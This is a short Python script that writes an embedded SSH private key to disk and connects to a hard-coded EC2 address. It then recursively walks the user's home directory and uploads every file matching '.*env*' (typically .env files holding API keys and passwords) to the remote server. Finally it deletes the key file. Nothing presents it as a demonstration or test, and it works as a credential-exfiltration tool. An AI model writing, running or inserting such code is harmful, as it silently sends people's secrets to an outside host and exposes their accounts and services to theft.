import paramiko
import os
import fnmatch

# Connection details
ec2_host = "23.20.49.160"
ec2_port = 22
ec2_user = "ec2-user"
pem_content = """
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAssQ+Nc7Fv4M2nmqbiqbT4OiYtzcBbxg6VrkQQ5c4wLRzsidcx8X4
tokdIEVgjXUq6PaobFFcjKlb3Qx16pXXh0oZYP92HtK7R6iwR5Yq6kDixeb802cW6KPdd/
lzEoYvIQrYbPqWeffU7baKFP8q7flrQ06/BOgv/Y6ulZ2OMWqzKyjBRK1F+b1qyjXWCPam
locW8TILMeOC730VPh650VgBL+UJCsLw8SzF3kerBgitsWcqXYEsrPD1fg2kl7+6fVTcV0
/bgMeMkftc7LuIxH3awq4pVCN69ELDCXODjEosfZri/ApdtbPp4+Vq4Jno97n8AXygpfTO
p+IG1w42CQAAA8DOxxldzscZXQAAAAdzc2gtcnNhAAABAQCyxD41zsW/gzaeapuKptPg6J
i3NwFvGDpWuRBDlzjAtHOyJ1zHxfi2iR0gRWCNdSro9qhsUVyMqVvdDHXqldeHShlg/3Ye
0rtHqLBHlirqQOLF5vzTZxboo913+XMShi8hCths+pZ599TttooU/yrt+WtDTr8E6C/9jq
6VnY4xarMrKMFErUX5vWrKNdYI9qaWhxbxMgsx44LvfRU+HrnRWAEv5QkKwvDxLMXeR6sG
CK2xZypdgSys8PV+DaSXv7p9VNxXT9uAx4yR+1zsu4jEfdrCrilUI3r0QsMJc4OMSix9mu
L8Cl21smyFjaJUF8Wk9I6mgXb4JQh1Y2mLJt8iGcW4W7x4JcF0JbYdJ8Kc/
-----END OPENSSH PRIVATE KEY-----
"""

# Create a temporary PEM file
with open("temp_key.pem", "w") as pem_file:
    pem_file.write(pem_content)

# Set permissions for the PEM file
os.chmod("temp_key.pem", 0o600)

# Initialize SSH client
ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

# Connect to the EC2 instance
ssh.connect(hostname=ec2_host, port=ec2_port, username=ec2_user, key_filename="temp_key.pem")

# Ensure the remote directory exists
sftp = ssh.open_sftp()
try:
    sftp.mkdir('/home/ec2-user/files')
except IOError:
    pass  # Directory already exists

# Upload files matching the .*env* pattern
local_dir = os.path.expanduser("~")
for root, dirs, files in os.walk(local_dir):
    for filename in fnmatch.filter(files, '.*env*'):
        local_path = os.path.join(root, filename)
        remote_path = f'/home/ec2-user/files/{filename}'
        sftp.put(local_path, remote_path)

# Close connections
sftp.close()
ssh.close()

# Remove the temporary PEM file
os.remove("temp_key.pem")